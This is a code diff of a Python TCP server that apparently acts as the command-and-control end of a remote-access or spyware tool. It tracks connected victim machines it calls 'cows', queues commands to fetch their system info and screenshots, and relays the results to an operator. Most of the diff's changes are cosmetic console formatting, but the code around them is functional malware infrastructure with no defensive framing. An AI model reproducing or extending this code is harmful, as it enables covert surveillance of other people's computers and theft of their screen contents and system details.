@@ -1,57 +1,72 @@
 import socket
 
-# ╔════════════════════════════════════════════════════════════════════╗
-# ║ > Server will listen on all interfaces at this port                ║
-# ╚════════════════════════════════════════════════════════════════════╝
 ip = '0.0.0.0'
 port = 4570
 
-# ╔════════════════════════════════════════════════════════════════════╗
-# ║ > Store seen device names and IPs                                  ║
-# ╚════════════════════════════════════════════════════════════════════╝
 DeviceIDList = []
 DeviceIPList = []
 
-# ╔════════════════════════════════════════════════════════════════════╗
-# ║ > Commands waiting to be sent to a specific device                 ║
-# ╚════════════════════════════════════════════════════════════════════╝
 pending_command = {}
 
-# ╔════════════════════════════════════════════════════════════════════╗
-# ║ > Responses sent back from clients                                 ║
-# ║ > Format: { device_name: { command_name: response_str } }          ║
-# ╚════════════════════════════════════════════════════════════════════╝
 response_buffer = {}
 
-# ╔════════════════════════════════════════════════════════════════════╗
-# ║ > Set up and start the TCP server                                  ║
-# ╚════════════════════════════════════════════════════════════════════╝
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_socket.bind((ip, port))
 server_socket.listen(5)
 
-print(f"[+] Server listening on {ip}:{port}")
+def print_boxed(text, r=20, g=200, b=20):
+    box_width = 60  # Fixed width of the box
+    padding = 2     # Padding for text inside the box
+    
+    # Create the top and bottom borders
+    top_border = "╔" + "═" * (box_width - 2) + "╗"
+    bottom_border = "╚" + "═" * (box_width - 2) + "╝"
+    
+    # Add '>' before the text
+    text = f"> {text}"
+
+    # Ensure the text fits within the box
+    if len(text) > box_width - 2:
+        text = text[:box_width - 4]  # Truncate text if it's too long
+        text = f"{text[:box_width - 4]}..."  # Add ellipsis for truncated text
+
+    # Add left and right borders around the text
+    text_line = "║ " + text.center(box_width - 4) + " ║"
+
+    # Set the RGB color using ANSI escape codes
+    rgb_color = f"\033[38;2;{r};{g};{b}m"
+    
+    # Print the full box with RGB colored text
+    colored_top = f"{rgb_color}{top_border}\033[0m"
+    colored_text = f"{rgb_color}{text_line}\033[0m"
+    colored_bottom = f"{rgb_color}{bottom_border}\033[0m"
+
+    print(colored_top)
+    print(colored_text)
+    print(colored_bottom)
+
+# ╔════════════════════════════════════════════════════════════════════╗
+# ║ > Server listening on all interfaces at this port                  ║
+# ╚════════════════════════════════════════════════════════════════════╝
+print_boxed(f"Server listening on {ip}:{port}")
 
 while True:
-    # ╔════════════════════════════════════════════════════════════════════╗
-    # ║ > Accept an incoming client connection                             ║
-    # ╚════════════════════════════════════════════════════════════════════╝
     client_socket, address = server_socket.accept()
     msg = client_socket.recv(4096).decode()
 
-    lines = msg.splitlines()  # Split message by lines
+    lines = msg.splitlines()
 
     # ╔════════════════════════════════════════════════════════════════════╗
     # ║ > Handle :CLIENTPING Command                                       ║
     # ╚════════════════════════════════════════════════════════════════════╝
     if msg.startswith(":CLIENTPING"):
-        name = lines[1]           # Device name
-        ip_addr = lines[2]        # IP address of the device
+        name = lines[1]
+        ip_addr = lines[2]
         if name not in DeviceIDList:
             DeviceIDList.append(name)
             DeviceIPList.append(ip_addr)
-            print(f"[+] New cow: {name} at {ip_addr}")
+            print_boxed(f"New cow: {name} at {ip_addr}")
 
         if pending_command.get(name):
             command = pending_command.pop(name)
@@ -63,11 +78,10 @@ while True:
     # ║ > Handle :PCINFO Command                                           ║
     # ╚════════════════════════════════════════════════════════════════════╝
     elif msg.startswith(":PCINFO"):
-        name = lines[1]               # Device name
-        info = "\n".join(lines[2:])   # Gather device info
-
-        print(f"\n[>] Received PCINFO from {name}.")
-        print(info)
+        name = lines[1]
+        info = "\n".join(lines[2:])
+        print_boxed(f"Received PCINFO from {name}.")
+        print_boxed(info)
 
         if name not in response_buffer:
             response_buffer[name] = {}
@@ -77,11 +91,10 @@ while True:
     # ║ > Handle :SCREENSHOT Command                                       ║
     # ╚════════════════════════════════════════════════════════════════════╝
     elif msg.startswith(":SCREENSHOT"):
-        name = lines[1]           # Device name
-        link = lines[2]           # Screenshot URL
-
-        print(f"\n[>] Received SCREENSHOT from {name}.")
-        print(link)
+        name = lines[1]
+        link = lines[2]
+        print_boxed(f"Received SCREENSHOT from {name}.")
+        print_boxed(link)
 
         if name not in response_buffer:
             response_buffer[name] = {}
@@ -91,23 +104,25 @@ while True:
     # ║ > Handle :GETINFO Command                                          ║
     # ╚════════════════════════════════════════════════════════════════════╝
     elif msg.startswith(":GETINFO"):
-        target = lines[1]  # Name of the target device
+        target = lines[1]
         pending_command[target] = ":COMMAND :GETINFO"
-        print(f"[+] Queued :GETINFO for {target}")
+        print_boxed(f"Queued :GETINFO for {target}")
 
     # ╔════════════════════════════════════════════════════════════════════╗
     # ║ > Handle :GETSCREENSHOT Command                                    ║
     # ╚════════════════════════════════════════════════════════════════════╝
     elif msg.startswith(":GETSCREENSHOT"):
-        target = lines[1]  # Name of the target device
+        target = lines[1]
         pending_command[target] = ":COMMAND :GETSCREENSHOT"
-        print(f"[+] Queued :GETSCREENSHOT for {target}")
+        print_boxed(f"Queued :GETSCREENSHOT for {target}")
 
     # ╔════════════════════════════════════════════════════════════════════╗
     # ║ > Handle :LISTCOWS Command                                         ║
     # ╚════════════════════════════════════════════════════════════════════╝
     elif msg.startswith(":LISTCOWS"):
-        print(DeviceIDList)
+        print_boxed("List of cows:")
+        for cow in DeviceIDList:
+            print_boxed(f"- {cow}")
         cows_list = "\n".join(DeviceIDList)
         client_socket.sendall(cows_list.encode())
 
@@ -124,7 +139,4 @@ while True:
         else:
             client_socket.send(b"No response available yet.\n")
 
-    # ╔════════════════════════════════════════════════════════════════════╗
-    # ║ > Close client connection                                          ║
-    # ╚════════════════════════════════════════════════════════════════════╝
     client_socket.close()
